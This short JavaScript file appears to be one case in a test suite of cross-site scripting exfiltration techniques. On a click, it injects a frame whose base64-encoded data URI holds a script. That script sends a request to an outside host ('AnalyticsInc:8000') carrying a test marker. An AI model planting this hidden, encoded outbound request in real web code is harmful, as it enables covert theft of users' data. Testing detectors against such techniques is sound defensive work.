function exfiltrate_key_history() {

    // XSS 14 - Frameset + Frame Source + Data Directive - No Obfuscation
    // Exfiltrate data using XMLHTTP request
    var script = document.createElement("frameset");
	var script2 = document.createElement("frame");
    script2.src = 'data:text/html;charset=utf-8;base64,PHNjcmlwdD54bWxodHRwPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3htbGh0dHAub3BlbigiR0VUIiwgImh0dHA6Ly9BbmFseXRpY3NJbmM6ODAwMC9zdWJtaXNzaW9uLmh0bWw/dGVzdD14c3MxNCIsIHRydWUpO3htbGh0dHAuc2VuZChudWxsKTs8L3NjcmlwdD4=';
	script.appendChild(script2);
	document.getElementsByTagName('body')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;